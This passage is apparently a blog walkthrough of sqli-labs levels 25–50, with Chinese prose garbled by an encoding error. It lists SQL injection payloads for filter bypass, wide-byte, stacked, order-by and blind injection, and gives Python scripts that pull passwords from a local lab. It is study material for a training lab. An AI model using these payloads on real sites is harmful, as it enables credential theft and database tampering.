class="hljs-string">&quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        response = requests.get(url+payload)        t = response.text        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> response.text:            left = mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            right = mid        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-comment"># print(mid)</span>    flag = flag + <span class="hljs-built_in">chr</span>(mid)    print(flag)print(flag)</code></pre><h2 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h2><p>26ä¸ä¸Šä¸€å…³ç›¸æ¯”ï¼Œå¾ˆç±»ä¼¼ï¼Œç©ºæ ¼ï¼Œæ³¨é‡Šç¬¦å’Œ / ä¹Ÿç»™è¿‡æ»¤äº†</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507094649645.png" alt="image-20210507094649645" style="zoom:50%;"><p>å¯¹äºæ³¨é‡Šå’Œç»“å°¾å­—ç¬¦çš„æˆ‘ä»¬æ­¤å¤„åªèƒ½åˆ©ç”¨æ„é€ ä¸€ä¸ª â€˜ æ¥é—­åˆåé¢åˆ° â€˜ ï¼›å¯¹äºç©ºæ ¼ï¼Œæœ‰è¾ƒå¤šçš„æ–¹æ³•ï¼š</p><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> TABé”®ï¼ˆæ°´å¹³ï¼‰<span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> æ–°å»ºä¸€è¡Œ<span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> æ–°çš„ä¸€é¡µ<span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> returnåŠŸèƒ½<span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> TABé”®ï¼ˆå‚ç›´ï¼‰<span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> ç©ºæ ¼(åº”è¯¥æ˜¯phpè½¬åŒ–çš„æ—¶å€™æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åmysqlä¼šè§£é‡Šä¸ºç©ºç™½å­—ç¬¦)</code></pre><p>å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…ç›²æ³¨</p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)&gt;&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><span class="hljs-attribute">0</span>&#x27;||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(Select%<span class="hljs-number">0</span>a@@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span></code></pre><h2 id="level26a"><a href="#level26a" class="headerlink" title="level26a"></a>level26a</h2><p>ä¸ä¸Šä¸€å…³ä¸€æ ·ï¼Œé¢˜ç›®æç¤ºç©ºæ ¼ä¸æ³¨é‡Šè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>%a0</code>ç»•è¿‡ï¼ŒæŠ¥é”™æ³¨å…¥ä¸å‡ºï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨</p><pre><code class="hljs perl"><span class="hljs-number">0</span><span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-comment">#æ¢æµ‹ä¸º&#x27;</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;||left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;%26%26&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span>ç™½ç›’å®¡è®¡çŸ¥é“æ˜¯<span class="hljs-string">&#x27;)</span><span class="hljs-string">0%27)%a0union%a0select%a01,database(),2||(&#x27;</span><span class="hljs-number">1</span><span class="hljs-number">0</span>%27)%a0union%a0select%a01,database(),<span class="hljs-number">2</span>;%00</code></pre><h2 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h2><p>é¢˜ç›®æç¤º<code>union</code>ä¸<code>select</code>è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨<code>preg_ireplace()</code>,æ‰€ä»¥å¯ç”¨å¤§å°å†™ç»•è¿‡</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095131602.png" alt="image-20210507095131602" style="zoom:50%;"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;||&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><span class="hljs-attribute">0</span>&#x27;||left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><span class="hljs-attribute">0</span>&#x27;%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre><h2 id="level27a"><a href="#level27a" class="headerlink" title="level27a"></a>level27a</h2><p>ä¸27å…³åŸºæœ¬ä¸€æ ·ï¼Œå°±æ˜¯åœ¨idå‚æ•°ä½ç½®æ²¡æœ‰ä½¿ç”¨å•å¼•å·é—­åˆ</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095515296.png" alt="image-20210507095515296"></p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095524859.png" alt="image-20210507095524859"></p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A<span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></code></pre><h2 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h2><p><code>union select</code>å¤§å°å†™å‡è¢«è¿‡æ»¤ï¼Œä½†æ˜¯<code>select</code>è¿˜å¯å•ç‹¬ç”¨ï¼Œç›²æ³¨å³å¯ï¼Œæ³¨æ„è¿™é‡Œçš„idé—­åˆæ–¹å¼ä¸º<code>(&#39;&#39;)</code></p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095639166.png" alt="image-20210507095639166" style="zoom:50%;"><pre><code class="hljs matlab"><span class="hljs-number">0</span>&#x27;)||left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">%00</span></code></pre><h2 id="level28a"><a href="#level28a" class="headerlink" title="level28a"></a>level28a</h2><p>ä¸28å…³ç›¸æ¯”ï¼Œç®€å•å¾ˆå¤šï¼Œåªæ˜¯è¿‡æ»¤äº†<code>union select</code>,æ‰€ä»¥å¯ä»¥ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„payload</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507095853009.png" alt="image-20210507095853009" style="zoom:50%;"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27;)||left((database()),<span class="hljs-number">1</span>)=&#x27;s&#x27;;%<span class="hljs-number">00</span><span class="hljs-attribute">0</span>&#x27;)||left((selEct%<span class="hljs-number">0</span>agroup_concat(schema_name)%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata),<span class="hljs-number">1</span>)&lt;&#x27;s&#x27;;%<span class="hljs-number">00</span></code></pre><h2 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h2><p>åˆ©ç”¨<code>tomcat</code>ä¸<code>apache</code>è§£æç›¸åŒè¯·æ±‚å‚æ•°ä¸åŒçš„ç‰¹æ€§ï¼Œ<code>tomcat</code>è§£æç›¸åŒè¯·æ±‚å‚æ•°å–ç¬¬ä¸€ä¸ªï¼Œè€Œ<code>apache</code>å–ç¬¬äºŒä¸ªï¼Œå¦‚<code>?id=1&amp;id=2</code>ï¼Œ<code>tomcat</code>å–å¾—1ï¼Œ<code>apache</code>å–å¾—2</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;%<span class="hljs-number">23</span></code></pre><h2 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h2><p>ä¸ 29 æ¶æ„ä¸€æ ·ï¼ŒåŸç†ä¸€è‡´åªä¸è¿‡åŠ äº†<code>&quot;</code>é™åˆ¶</p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre><h2 id="level31"><a href="#level31" class="headerlink" title="level31"></a>level31</h2><p>æ¶æ„ä¸€æ ·ï¼Œå¤šäº†<code>&quot;)</code></p><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 <span class="hljs-keyword">from</span> information_schema.schemata;%23</code></pre><h2 id="level32"><a href="#level32" class="headerlink" title="level32"></a>level32</h2><p>æ³¨æ„æ˜¯<code>GBK</code>ï¼Œå¯ä»¥ç”¨<code>%df</code>è¿›è¡Œå®½å­—èŠ‚æ³¨å…¥</p><p>å®½å­—èŠ‚æ³¨å…¥</p><p>å®½å­—èŠ‚æ³¨å…¥åˆ©ç”¨äº†mysqlä¸€ä¸ªç‰¹æ€§ï¼Œ<strong>å³å½“mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—</strong>ã€‚ï¼ˆå‰ä¸€ä¸ªASCIIç <strong>è¦å¤§äº128</strong>ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰</p><p>å…ˆäº†è§£ä¸€ä¸‹è¿™äº›å­—ç¬¦çš„urlç¼–ç ï¼š</p><p><img src="https://segmentfault.com/img/bVbzjiJ" alt="image.png"></p><p>å½“è¾“å…¥å•å¼•å·ï¼Œç»addslashesè½¬ä¹‰åï¼Œå¯¹åº”çš„urlç¼–ç æ˜¯ï¼š<br><strong>â€˜ â€“&gt; &#39; â€“&gt; %5C%27</strong><br>å½“åœ¨å‰é¢å¼•å…¥ä¸€ä¸ªASCIIå¤§äº128çš„å­—ç¬¦ï¼ˆæ¯”å¦‚%dfï¼‰ï¼Œurlç¼–ç å˜ä¸ºï¼š<br><strong>%df â€“&gt; %df \ â€˜ â€“&gt; ï¼ˆ%df%5Cï¼‰%27</strong></p><p>è‹¥ä½¿ç”¨gbkç¼–ç çš„è¯ï¼Œ<strong>%df%5Cä¼šè¢«å½“ä½œä¸€ä¸ªæ±‰å­—å¤„ç†</strong>ï¼Œä»è€Œä½¿%27ï¼ˆå•å¼•å·ï¼‰é€ƒå‡ºç”Ÿå¤©ï¼ŒæˆåŠŸç»•è¿‡</p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span><span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre><h2 id="level33"><a href="#level33" class="headerlink" title="level33"></a>level33</h2><p>ä¸32ç›¸åŒ</p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>%df&#x27; union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></code></pre><h2 id="level34"><a href="#level34" class="headerlink" title="level34"></a>level34</h2><p>è¿™å…³çš„è¿‡æ»¤æ–¹å¼å’Œå‰é¢ä¸€æ ·ï¼Œè€ƒè™‘å®½å­—èŠ‚æ³¨å…¥ï¼Œä½†æ˜¯POSTä¼ å…¥æ•°æ®æ—¶ä¸ä¼šè¿›è¡ŒURLç¼–ç ï¼Œå› æ­¤è¿™é‡Œé‡‡ç”¨å°†utf8å•å¼•å·è½¬ä¸ºutf-16/utf-32ç¼–ç ç»•è¿‡ï¼Œå³å°†<code>&#39;</code>è½¬ä¸ºutf-16ä¸º <code>ï¿½&#39;</code></p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>ï¿½&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<span class="hljs-attribute">Password</span>: ä»»æ„</code></pre><h2 id="level35"><a href="#level35" class="headerlink" title="level35"></a>level35</h2><p>GETå‹å®½å­—èŠ‚æ³¨å…¥ï¼Œä½†åŒºåˆ«æ˜¯è¿™é‡Œæ˜¯æ•°å­—å‹ï¼Œä¸éœ€è¦ç”¨å•å¼•å·é—­åˆäº†ï¼Œå…¶ä»–çš„å’Œless-32ä¸€æ ·ï¼Œ16è¿›åˆ¶ç»•è¿‡ä¸€ä¸‹è¡¨åå³å¯ã€‚</p><p>payload:</p><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)<span class="hljs-comment">--+</span></code></pre><h2 id="level36"><a href="#level36" class="headerlink" title="level36"></a>level36</h2><p>ç›´æ¥ä½¿ç”¨32å…³çš„payload</p><pre><code class="hljs n1ql">?id=-1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> users),(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users)--+</code></pre><h2 id="level37"><a href="#level37" class="headerlink" title="level37"></a>level37</h2><p>å’Œless-34ä¸€æ ·</p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">Username</span>: <span class="hljs-number">1</span>ï¿½&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<span class="hljs-attribute">Password</span>: ä»»æ„</code></pre><h2 id="level38"><a href="#level38" class="headerlink" title="level38"></a>level38</h2><p>å †å æ³¨å…¥ï¼šå¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œç”¨åˆ†å·é—´éš”</p><p>å †å æ³¨å…¥ä¼˜ç‚¹æ˜¯å¯ä»¥æ‰§è¡Œçš„è¯­å¥æ›´åŠ çµæ´»ï¼Œå¦‚Createã€Deleteã€Updateã€Insertã€Dropâ€¦.ï¼Œä½†ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œåœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„</p><p>å¯ä»¥ä½¿ç”¨createåˆ›å»ºä¸€å¼ è¡¨</p><pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;;create <span class="hljs-built_in">table</span> test like users;<span class="hljs-comment">%23</span></code></pre><p>ä¹Ÿå¯ä»¥å‘æ•°æ®åŒ…ä¸­æ’å…¥ä¸€æ¡æ•°æ®</p><pre><code class="hljs n1ql">?id=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre><h2 id="level39"><a href="#level39" class="headerlink" title="level39"></a>level39</h2><p>å’Œ38ä¸€æ ·ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯æ•°å­—å‹ï¼Œæ— éœ€é—­åˆã€‚</p><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;20&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="level40"><a href="#level40" class="headerlink" title="level40"></a>level40</h2><p>é—­åˆæ–¹å¼ä¸åŒè€Œå·²</p><p>payload</p><pre><code class="hljs n1ql">?id=1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre><h2 id="level41"><a href="#level41" class="headerlink" title="level41"></a>level41</h2><p>æ•°å­—å‹æ³¨å…¥ä¸39å…³ç›¸åŒ</p><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="level42"><a href="#level42" class="headerlink" title="level42"></a>level42</h2><p>ä¸ä¹‹å‰å‡ å…³ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œçš„usernameä½ç½®è¿›è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦passwordä½ç½®è¿›è¡Œå †å æ³¨å…¥</p><p>payload</p><pre><code class="hljs n1ql">Usernameï¼šusnnPasswordï¼š1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre><p>ç‚¹å‡»ç™»å½•åï¼Œä¼šå‘ç°ç™»å½•å¤±è´¥ï¼Œä½†æ˜¯inertè¯­å¥å·²ç»è¢«æ‰§è¡Œäº†ï¼Œå¯ä»¥ä½¿ç”¨admin123è´¦å·ç›´æ¥ç™»å½•</p><h2 id="level43"><a href="#level43" class="headerlink" title="level43"></a>level43</h2><p>ä¸42çš„é—­åˆæ–¹å¼ä¸åŒ</p><p>ä½¿ç”¨çš„æ˜¯<code>(&#39;&#39;)</code></p><p>payload</p><pre><code class="hljs n1ql">Usernameï¼šusnnPasswordï¼š1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre><h2 id="level44"><a href="#level44" class="headerlink" title="level44"></a>level44</h2><p>ä¸42ç›¸åŒ</p><pre><code class="hljs n1ql">Usernameï¼šusnnPasswordï¼š1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre><h2 id="level45"><a href="#level45" class="headerlink" title="level45"></a>level45</h2><p>ä¸43ç›¸åŒ</p><pre><code class="hljs n1ql">Usernameï¼šusnnPasswordï¼š1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;15&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)#</code></pre><h2 id="level46"><a href="#level46" class="headerlink" title="level46"></a>level46</h2><p><code>order by</code>æ³¨å…¥</p><p><code>username</code>ã€<code>password</code>å‡ä¸ºåˆ—åï¼Œæ‰€ä»¥ä»¥ä¸‹éœ€è¦çŸ¥é“åˆ—å</p><pre><code class="hljs pgsql">?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)?<span class="hljs-keyword">order</span>=<span class="hljs-keyword">null</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span>)?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">then</span> username <span class="hljs-keyword">else</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">end</span>)?<span class="hljs-keyword">order</span>=ifnull(<span class="hljs-keyword">null</span>, username)?<span class="hljs-keyword">order</span>=rand(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)    //<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(<span class="hljs-number">1</span>)/rand(<span class="hljs-number">0</span>)ä¸¤è€…è¿”å›ä¸ä¸€æ ·?<span class="hljs-keyword">order</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> regexp <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x00</span>))</code></pre><p>å°†<code>1=1</code>æ¢æˆboolç›²æ³¨çš„è¯­å¥å‡½æ•°å³å¯ç”¨äºè·å–æ•°æ®<br><code>sort=rand(ascii(database(),1))=115)</code></p><p>æ—¶é—´ç›²æ³¨</p><pre><code class="hljs pgsql">sort=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">116</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))sort=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(substring(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-type">char</span>(<span class="hljs-number">115</span>),benchmatrk(<span class="hljs-number">5000000</span>,md5(<span class="hljs-string">&#x27;1&#x27;</span>)),<span class="hljs-keyword">null</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1)</code></pre><p>Bool ç›²æ³¨</p><pre><code class="hljs pgsql">rand(ascii(left(<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)</code></pre><p>æŠ¥é”™æ³¨å…¥ï¼š</p><pre><code class="hljs pgsql">updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,floor(rand()*<span class="hljs-number">2</span>)))</code></pre><p>procedure analyse å‚æ•°åæ³¨å…¥</p><pre><code class="hljs cal">sort=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(extractvalue(rand()</span>,<span class="hljs-title">concat</span><span class="hljs-params">(0x3a,version()</span>)),1)</span></code></pre><p>into outfileå‚æ•°:</p><pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfield <span class="hljs-string">&quot;path&quot;</span></code></pre><p>ä¸Šä¼ ç½‘é©¬ï¼Œå¯ä»¥åœ¨åé¢åŠ ä¸Š<code>lines terminated by 16</code>è¿›åˆ¶è½¬ç çš„æ•°æ®</p><h2 id="level47"><a href="#level47" class="headerlink" title="level47"></a>level47</h2><p>ä¸46çš„é—­åˆé˜²æ­¢ä¸ç”¨ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><pre><code class="hljs n1ql">?sort=1&#x27; and extractvalue(1,concat(0x7e,( <span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>))--+</code></pre><h2 id="level48"><a href="#level48" class="headerlink" title="level48"></a>level48</h2><p>ä½¿ç”¨æ—¶é—´ç›²æ³¨</p><pre><code class="hljs lisp"><span class="hljs-number">1</span> and If(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;115,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+sort=rand(<span class="hljs-name">ascii</span>(<span class="hljs-name">left</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>))=115)</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&#x27;http://127.0.0.1/Less-48/</span><span class="hljs-string">payloads = &#x27;</span>QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_<span class="hljs-string">&#x27;</span><span class="hljs-string">data = &#x27;</span><span class="hljs-string">&#x27;</span><span class="hljs-string">for i in range(50):</span><span class="hljs-string">    for j in payloads:</span><span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span><span class="hljs-string">        # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;</span><span class="hljs-string">        payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;) ,&#123;i&#125;,1)=&#x27;</span>&#123;j&#125;<span class="hljs-string">&#x27;),sleep(3),1)&quot;       </span><span class="hljs-string">        try:</span><span class="hljs-string">            r = requests.get(url+payload, timeout=1)</span><span class="hljs-string">        except Exception:</span><span class="hljs-string">            data += j</span><span class="hljs-string">            print(data)</span><span class="hljs-string">            break</span></code></pre><h2 id="level49"><a href="#level49" class="headerlink" title="level49"></a>level49</h2><p>ä¸47çš„é—­åˆæ–¹å¼ä¸åŒï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç›²æ³¨</p><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>(<span class="hljs-params">database</span>()</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-constructor">If(<span class="hljs-params">ascii</span>(<span class="hljs-params">substr</span>((<span class="hljs-params">select</span> <span class="hljs-params">username</span> <span class="hljs-params">from</span> <span class="hljs-params">users</span> <span class="hljs-params">where</span> <span class="hljs-params">id</span>=1)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)))--+</code></pre><h2 id="level50"><a href="#level50" class="headerlink" title="level50"></a>level50</h2><p>order byä¸å †å 